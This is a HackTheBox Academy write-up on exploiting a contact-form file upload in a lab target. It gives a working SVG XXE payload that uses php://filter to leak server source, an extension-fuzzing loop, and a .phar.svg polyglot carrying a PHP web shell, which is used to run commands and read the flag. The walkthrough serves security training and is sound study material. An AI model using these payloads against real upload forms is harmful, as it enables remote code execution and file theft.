# HTB Academy — File Upload Attacks · Skills Assessment Write-up

> **Module:** File Upload Attacks (HackTheBox Academy)
> **Objective:** Exploit the file-upload functionality to achieve Remote Code Execution and read the flag located in the root directory `/`.
> **Result:** Full RCE as `www-data` through a chained bypass of four validation layers, using an `.phar.svg` polyglot combined with an SVG-based XXE for source-code disclosure.

> **Note on the target address:** the box is referred to throughout as `154.57.164.66:30591`. HTB spawns dynamic instances, so your IP and port will differ — adjust the commands accordingly.

---

## 1. Scenario & Objective

We were engaged to perform a penetration test against a company's website. While browsing the application, a **"Contact Us"** page immediately stands out: it lets visitors send feedback **and attach a file**. Any upload feature is a prime candidate for abuse, so this becomes our first target — the goal is to understand exactly what the form accepts and, ultimately, to turn that upload into code execution.

---

## 2. Reconnaissance

### 2.1 The Contact Form

The page exposes a standard contact form (Name, Email, Message) with an **"Attach a screenshot"** upload field. Uploading a non-image returns the message `Only images are allowed`, so some server-side validation is clearly in place.

<img width="1917" height="898" alt="form" src="https://github.com/user-attachments/assets/80a10a04-1a1b-4231-84e3-f7e3f30a4fb2" />


### 2.2 GET vs. POST — Finding the Real Upload Endpoint

Inspecting the request in the proxy reveals something odd: the visible form parameters (`Name`, `Email`, `Message`, `uploadFile`) are sent via **GET** to `submit.php`. That means the GET request only carries the *file name*, not the file itself — the actual multipart **POST** that transports the file is fired separately and isn't shown to us directly. To enumerate the upload properly, we first need to capture that hidden POST.

We do this from the browser: **DevTools → Network**, enable request logging, then trigger an upload with a legitimate `real.jpg`. The `POST /contact/upload.php` request appears in the list. Right-clicking it and choosing **"Copy as cURL"** gives us the complete, replayable request.

<img width="1917" height="827" alt="uploadrequest" src="https://github.com/user-attachments/assets/aa313eb1-0105-450f-8fd6-de0d85285f2e" />

The captured request:

```bash
curl 'http://154.57.164.66:30591/contact/upload.php' \
  --compressed \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Content-Type: multipart/form-data; boundary=----geckoformboundary6ecb17aca4bfe919d099975674bece39' \
  -H 'Origin: http://154.57.164.66:30591' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://154.57.164.66:30591/contact/' \
  --data-binary \
  $'------geckoformboundary6ecb17aca4bfe919d099975674bece39\r\nContent-Disposition: form-data; name="uploadFile"; filename="real.jpg"\r\nContent-Type: image/jpeg\r\n\r\n------geckoformboundary6ecb17aca4bfe919d099975674bece39--\r\n'
```

Now we have the real endpoint (`/contact/upload.php`) and full control over the request. From here there are two ways to enumerate: **Burp Intruder** or **plain bash + curl**. We go with the second option for maximum control and transparency. Working directly with `curl` also means we bypass any client-side JavaScript validation for free — no browser, nothing to circumvent.

For the following requests we keep the two headers that the endpoint appears to care about: `X-Requested-With: XMLHttpRequest` and `Referer`.

---

## 3. Extension Enumeration

### 3.1 Building a Focused Wordlist

Instead of throwing the entire SecLists extension list at the server, we filter it down to the PHP-relevant candidates. Starting from `web-extensions.txt`, we grep the `ph*` family and save it to `phext.txt`:

```bash
grep -i 'ph' web-extensions.txt > phext.txt
```

This keeps only the extensions with a realistic chance of being executed as PHP (`.php`, `.php2`–`.php7`, `.phps`, `.pht`, `.phtml`, `.phar`).

### 3.2 The Fuzzing Loop

We upload the same decoy file while varying **only** the extension in the sent `filename`, so any difference in the response depends solely on the extension:

```bash
for ext in $(cat phext.txt); do
  echo -n "${ext} → "
  curl -s 'http://154.57.164.66:30591/contact/upload.php' \
    -H 'X-Requested-With: XMLHttpRequest' \
    -H 'Referer: http://154.57.164.66:30591/contact/' \
    -F "uploadFile=@test.txt;filename=test${ext};type=image/jpeg"
  echo
done
```

<img width="1906" height="827" alt="scriptenumeration" src="https://github.com/user-attachments/assets/6ee63aa1-83d4-4fad-9728-95f6c7e5fbc8" />

### 3.3 Reading the Two Different Error Messages

This is the key observation of the whole assessment. The server replies in **two distinct ways**, and that difference maps the internal filter for us:

| Extensions | Server response | Meaning |
|---|---|---|
| `.php`, `.php2`–`.php7`, `.phps`, `.phtml` | `Extension not allowed` | 🚫 Stopped by the **blacklist** (first gate) |
| `.pht`, `.phar` | `Only images are allowed` | ⚠️ **Passed the blacklist**, stopped later by the **whitelist** |

The checks run **in sequence**: if the first message is *"Extension not allowed"*, the request was rejected at the blacklist. If it's *"Only images are allowed"*, it made it **past** the blacklist and was only stopped by a later filter. In other words, the second message means *"the blacklist doesn't know this extension."*

`.pht` and `.phar` slip past the blacklist. Both are extensions the server can execute as PHP — we'll use **`.phar`** in the final payload.

---

## 4. From SVG to XXE — Source Code Disclosure

Extensions alone won't get us there: the file still needs to satisfy the image whitelist. Recalling that an **SVG is an image written in XML**, we try uploading an SVG — and it is **accepted**. That's significant: if the server parses our XML, we can leverage **XXE (XML External Entity)** to read local files, even without RCE.

Rather than blindly crafting a shell, we first use XXE to **exfiltrate the source of `upload.php`** so we know exactly what we're up against. We reuse the same `php://filter` base64 trick from the File Inclusion module:

```bash
cat << 'EOF' > shell.svg
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
EOF
```

The `php://filter` wrapper reads `upload.php` and returns its contents **base64-encoded** (so PHP tags don't break the XML parsing). We send it, declaring the content type as `image/svg+xml`:

```bash
curl -s 'http://154.57.164.66:30591/contact/upload.php' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Referer: http://154.57.164.66:30591/contact/' \
  -F "uploadFile=@shell.svg;type=image/svg+xml"
```

The response contains the rendered SVG with a long base64 blob where the entity was resolved:

<img width="1900" height="207" alt="base64 response" src="https://github.com/user-attachments/assets/1939328d-e121-4c88-a1c3-894e71a95ee9" />

We decode it locally:

```bash
echo 'PD9waHAKcmVxdWlyZV9vbmNlKCcuL2NvbW1vbi1mdW5jdGlvbnMucGhwJyk7...' | base64 -d
```

---

## 5. Analyzing `upload.php`

The decoded source finally shows us the full validation logic — and two crucial operational details.

<img width="1316" height="722" alt="targetdir" src="https://github.com/user-attachments/assets/5e39406b-8be5-44ad-88e1-a7b49bfc58e8" />

<!-- IMAGE: targetdir.png -->

```php
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}
```

### The four filters

1. **Blacklist** — `/.+\.ph(p|ps|tml)/` blocks names containing `.php`, `.phps`, or `.phtml`. It does **not** cover `.phar` or `.pht` (which is why they passed).
2. **Whitelist** — `/^.+\.[a-z]{2,3}g$/` requires the name to **end** with a dot, then 2–3 lowercase letters, the **last of which must be `g`** (e.g. `.svg`, `.jpg`, `.png`). Because of the `$` anchor, only the *final* extension counts.
3. **Type test** — this is the subtle one. It loops over **two** values and requires **both** to match `image/[a-z]{2,3}g`:
   - `$contentType` — the `Content-Type` header we declare (easy to fake), and
   - `$MIMEtype` — the **real** MIME type from `mime_content_type()`, which inspects the file's actual bytes.

   Faking only the header is not enough: the real content has to be recognized as an image type ending in `g` too. `image/gif` ends in `f` and would fail — the only content that satisfies both is a **genuine SVG** (`mime_content_type()` → `image/svg+xml`, which contains `image/svg` → `sv` + `g`).
4. **Size** — must be under 500,000 bytes.

### Two operational details

- **Upload directory:** `$target_dir = "./user_feedback_submissions/"` (relative to `/contact/`), so files land in `/contact/user_feedback_submissions/`.
- **Renaming scheme:** `$fileName = date('ymd') . '_' . <original name>`. The server prepends **today's date** in `yymmdd` format plus an underscore. This is essential later: our uploaded shell won't keep its original name — we'll have to reconstruct the date-prefixed name to reach it.

---

## 6. Crafting the Payload: `shell.phar.svg`

After analyzing the filters, the winning filename is **`shell.phar.svg`**, which satisfies all four checks simultaneously. Each part of the name/content answers one specific control:

| Part | Defeats | Why |
|---|---|---|
| `.svg` (final extension) | **Whitelist** `[a-z]{2,3}g$` | Ends in `g`, and SVG is armable (XML → can carry PHP) |
| `.phar` (middle extension) | **Execution handler** | Server executes `.phar` as PHP → our code runs |
| *(avoids `.php/.phps/.phtml`)* | **Blacklist** `ph(p\|ps\|tml)` | `.phar` isn't on the list |
| Genuine SVG content | **Type test** (real MIME) | `mime_content_type()` → `image/svg+xml` → matches; `image/svg+xml` header matches too |
| `<?php ... ?>` block | **Objective** | Executed as PHP once the file is served |

We build the polyglot — a valid SVG that also carries a PHP web shell:

```bash
cat << 'EOF' > shell.phar.svg
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
<?php system($_REQUEST['cmd']); ?>
EOF
```

And upload it, declaring `image/svg+xml`:

```bash
curl -s 'http://154.57.164.66:30591/contact/upload.php' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Referer: http://154.57.164.66:30591/contact/' \
  -F "uploadFile=@shell.phar.svg;type=image/svg+xml"
```

The server responds by rendering the freshly stored file (`displayHTMLImage($target_file)`) — which is our **confirmation that the upload succeeded**.

---

## 7. Achieving RCE

To trigger the shell we need its real, date-prefixed name inside the uploads directory. To avoid retyping the date and the base URL on every request, we set two shell variables:

- **`YMD`** reproduces the server's `date('ymd')` prefix using the same `yymmdd` format.
- **`BASE`** holds the uploads URL so we only write `${BASE}` from now on.

```bash
YMD=$(date +%y%m%d)
BASE="http://154.57.164.66:30591/contact/user_feedback_submissions"

curl "${BASE}/${YMD}_shell.phar.svg?cmd=id"
```

The request resolves to `.../user_feedback_submissions/<yymmdd>_shell.phar.svg?cmd=id` and returns:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<img width="1528" height="240" alt="shell" src="https://github.com/user-attachments/assets/932a4cb8-39a9-46b2-974e-92290d2afa69" />

We have code execution as `www-data`. The first lines of the output are the static SVG/XXE content of the file being served; Apache then reaches the `<?php system($_REQUEST['cmd']); ?>` block and executes it — the last line is the output of our command.

> **Tip:** `date('ymd')` uses the **server's** timezone. If the request 404s, the prefix is likely off by a day — retry with `date -d 'yesterday' +%y%m%d` (or the next day).

---

## 8. Capturing the Flag

The objective states the flag is in the root directory, so we list `/`:

```bash
curl "${BASE}/${YMD}_shell.phar.svg?cmd=dir%20/"
```

The listing reveals the flag file at the filesystem root:

```
bin   boot   dev   etc   flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt   home   ...
```


<img width="1623" height="496" alt="flag" src="https://github.com/user-attachments/assets/0c888d4b-e4d9-4103-a11e-24db716e1f12" />

Finally, we read it:

```bash
curl "${BASE}/${YMD}_shell.phar.svg?cmd=cat%20/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt"
```

```
HTB{...}      # flag retrieved
```

**Assessment complete.** ✅

---

## Attack Chain Summary

| # | Phase | Action | Outcome |
|---|-------|--------|---------|
| 1 | Recon | Identify contact form; capture hidden `POST /upload.php` via DevTools | Real endpoint + replayable request |
| 2 | Enumeration | Fuzz PHP extensions with a bash loop | `.pht` / `.phar` pass the blacklist |
| 3 | Pivot | Upload SVG (image = XML) | Accepted → XXE possible |
| 4 | Source disclosure | SVG XXE with `php://filter` | Full `upload.php` source obtained |
| 5 | Analysis | Read the 4 filters, upload dir, date-based naming | Payload requirements known exactly |
| 6 | Weaponization | Craft `shell.phar.svg` polyglot | Passes all four validation layers |
| 7 | RCE | Reach date-prefixed shell, run `?cmd=id` | `uid=33(www-data)` |
| 8 | Loot | `cmd=dir /` → `cmd=cat` the flag | Flag captured |

---
